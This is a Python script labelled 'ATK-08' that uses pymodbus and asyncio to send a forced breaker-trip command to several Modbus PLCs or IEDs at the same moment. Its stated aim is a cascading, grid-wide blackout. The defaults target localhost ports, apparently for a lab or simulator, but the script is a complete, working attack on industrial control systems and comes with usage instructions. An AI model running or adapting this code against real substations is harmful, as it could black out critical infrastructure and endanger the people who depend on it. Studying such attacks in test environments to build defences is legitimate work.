#!/usr/bin/env python3
"""
ATK-08 | Coordinated Multi-IED Attack
=====================================
A single tripped breaker on a grid often won't cause a blackout because
power can be re-routed. A Coordinated Multi-IED attack leverages Python's
asynchronous capabilities (asyncio) to fire Modbus attack payloads at 
multiple PLCs simultaneously. 

By striking different substations at the exact same millisecond, the physical
grid has no time to shed load or re-route power, resulting in a cascading 
total system blackout.

Usage
-----
    python atk08_multi_ied_attack.py
    python atk08_multi_ied_attack.py --targets 127.0.0.1:5020,127.0.0.1:5021 --coil 0
"""
import argparse
import asyncio
import time
from pymodbus.client import ModbusTcpClient

async def attack_ied(target_str, coil):
    """
    Sub-task wrapper that connects and attacks an individual IED.
    We run the standard synchronous ModbusTcpClient in a background thread
    so it doesn't block the asyncio event loop.
    """
    def _attack():
        ip, port_str = target_str.split(":")
        port = int(port_str)
        
        client = ModbusTcpClient(ip, port=port, timeout=2)
        if not client.connect():
            print(f"[-] FAILED: Could not connect to IED at {target_str}")
            return
            
        print(f"[*] Payload delivered to {target_str} (Coil {coil} -> TRUE)")
        # Fire rogue trip payload
        client.write_coil(coil, True)
        client.close()

    # Offload the blocking network call to a thread so all IEDs fire simultaneously
    await asyncio.to_thread(_attack)

async def launch_coordinated_strike(targets, coil):
    print("[*] Initiating simultaneous strike protocol...")
    start_time = time.time()
    
    # Create an async task for every target
    tasks = [attack_ied(t.strip(), coil) for t in targets]
    
    # Fire them all at the exact same time
    await asyncio.gather(*tasks)
    
    duration = time.time() - start_time
    print(f"\n[+] Strike completed in {duration:.3f} seconds.")
    print("[+] All targeted breakers commanded to OPEN. Total blackout achieved.")

def main():
    parser = argparse.ArgumentParser(
        description="ATK-08: Simultaneously trip multiple IEDs to cause a grid-wide blackout."
    )
    parser.add_argument("--targets", type=str, default="127.0.0.1:5020", 
                        help="Comma-separated list of IED targets (e.g. 127.0.0.1:5020,127.0.0.1:5021)")
    parser.add_argument("--coil", type=int, default=0, help="Coil address (default 0)")
    
    args = parser.parse_args()
    
    target_list = [t for t in args.targets.split(",") if t]
    
    print("=" * 60)
    print("  ATK-08  |  Coordinated Multi-IED Attack")
    print("=" * 60)
    print(f"[*] Target IEDs     : {len(target_list)} nodes detected ({args.targets})")
    print(f"[*] Payload         : Force Trip (Coil {args.coil})")
    print()

    # Run the asyncio event loop
    try:
        asyncio.run(launch_coordinated_strike(target_list, args.coil))
    except KeyboardInterrupt:
        print("\n[!] Attack halted.")

if __name__ == "__main__":
    main()
